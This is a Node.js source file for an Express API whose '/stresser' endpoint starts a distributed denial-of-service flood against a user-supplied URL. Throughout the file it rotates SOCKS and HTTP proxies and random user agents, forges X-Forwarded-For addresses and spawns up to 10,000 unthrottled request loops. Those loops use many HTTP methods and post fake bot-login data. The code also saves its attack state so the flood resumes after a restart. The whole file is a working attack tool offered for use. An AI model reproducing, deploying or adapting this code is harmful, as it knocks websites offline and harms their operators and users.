const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { rainbow } = require("gradient-string");
const { fakeState } = require("./fakeState.js");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, "attackState.json");
const proxyFilePath = path.join(__dirname, "proxy.txt");
const uaFilePath = path.join(__dirname, "ua.txt");

const ensureStateFile = () => {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
  }
};

const loadState = () => {
  ensureStateFile();
  try {
    return JSON.parse(fs.readFileSync(stateFilePath, "utf-8"));
  } catch {
    return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
  }
};

let { continueAttack, startTime, duration, targetUrl } = loadState();

if (continueAttack && startTime && duration && Date.now() > startTime + duration) {
  continueAttack = false;
  fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
}

const headersList = {
  "Accept-Language": ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5", "en-US,en;q=0.9"],
  "Accept": ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],
  "Referer": ["http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://coccoc.com/search#query=", "https://net25.com/news"],
  "Cache-Control": [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  ],
};

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const sanitizeUA = (ua) => ua.replace(/[^\x20-\x7E]/g, "");
const loadProxies = () => fs.readFileSync(proxyFilePath, "utf-8").split("\n").map((line) => line.trim()).filter(Boolean);
const loadUserAgents = () => fs.readFileSync(uaFilePath, "utf-8").split("\n").map((line) => line.trim()).filter(Boolean);

const generateHeaders = (url) => ({
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent": sanitizeUA(getRandomElement(loadUserAgents())),
  "Accept": getRandomElement(headersList["Accept"]),
  "Accept-Language": getRandomElement(headersList["Accept-Language"]),
  "Cache-Control": getRandomElement(headersList["Cache-Control"]),
  "Referer": getRandomElement(headersList["Referer"]),
  "Connection": "keep-alive",
  "DNT": "1",
  "Upgrade-Insecure-Requests": "1",
  "Accept-Encoding": "gzip, deflate, br",
  "X-Forwarded-For": Array(4).fill().map(() => Math.floor(Math.random() * 256)).join("."),
  "Host": url.replace(/https?:\/\//, "").split("/")[0],
  "Origin": url.split("/").slice(0, 3).join("/"),
  "X-Requested-With": "XMLHttpRequest",
});

const performAttack = async (url, agent) => {
  if (!continueAttack || (startTime && duration && Date.now() > startTime + duration)) {
    continueAttack = false;
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
    return;
  }

  const headers = generateHeaders(url);
  const methods = [
    { method: "post", url: `${url.match(/^(https?:\/\/[^\/]+)/)[0]}/create`, data: { appstate: fakeState(), botname: getRandomElement(["Alpha", "Beta", "Gamma"]), botadmin: Array(14).fill().map(() => Math.floor(Math.random() * 10)).join(""), botprefix: "!@#$%^&*"[Math.floor(Math.random() * 8)], username: `Alpha${Math.random().toString(36).slice(2, 6)}${Math.floor(Math.random() * 100)}` } },
    { method: "post", url: `${url.match(/^(https?:\/\/[^\/]+)/)[0]}/login`, data: { state: fakeState() } },
    { method: "put", url, data: { state: fakeState() } },
    { method: "delete", url, data: { state: fakeState() } },
    { method: "patch", url, data: { state: fakeState() } },
    { method: "head", url },
    { method: "options", url },
    { method: "get", url },
  ];

  for (const { method, url: reqUrl, data } of methods) {
    axios({ method, url: reqUrl, data, httpAgent: agent, headers, timeout: 0 })
      .catch((err) => {
        if (err.response?.status === 503) console.log(rainbow("Target under heavy load (503) - Game Over!"));
        else if (err.response?.status === 502) console.log(rainbow("Bad Gateway (502)."));
      })
      .finally(() => setTimeout(() => performAttack(url, agent), 0));
  }
};

const startAttack = (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) {
    console.error("Invalid URL.");
    return false;
  }

  const proxies = loadProxies();
  if (!proxies.length) {
    console.error("No proxies found.");
    return false;
  }

  continueAttack = true;
  targetUrl = url;
  startTime = Date.now();
  duration = durationHours * 3600 * 1000;

  fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack, startTime, duration, targetUrl }));
  setTimeout(() => {
    continueAttack = false;
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
  }, duration);

  for (let i = 0; i < 10000 && continueAttack; i++) {
    const [host, port] = getRandomElement(proxies).split(":");
    const agent = host.startsWith("socks") ? new SocksProxyAgent(`socks5://${host}:${port}`) : new HttpsProxyAgent(`http://${host}:${port}`);
    performAttack(url, agent);
  }
  return true;
};

app.get("/stresser", async (req, res) => {
  const { url, duration = 1 } = req.query;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL." });
  if (isNaN(duration) || duration <= 0) return res.status(400).json({ error: "Invalid duration." });

  await res.json({ message: "Starting DDOS ATTACK..." });
  startAttack(url, parseFloat(duration));
});

const port = process.env.PORT || Math.floor(Math.random() * (65535 - 1024)) + 1024;
app.listen(port, () => {
  console.log(rainbow(`API running on http://localhost:${port}`));
  if (continueAttack && startTime && duration) {
    const remainingDuration = (startTime + duration - Date.now()) / 3600 / 1000;
    if (remainingDuration > 0) startAttack(targetUrl, remainingDuration);
    else {
      continueAttack = false;
      fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
    }
  }
});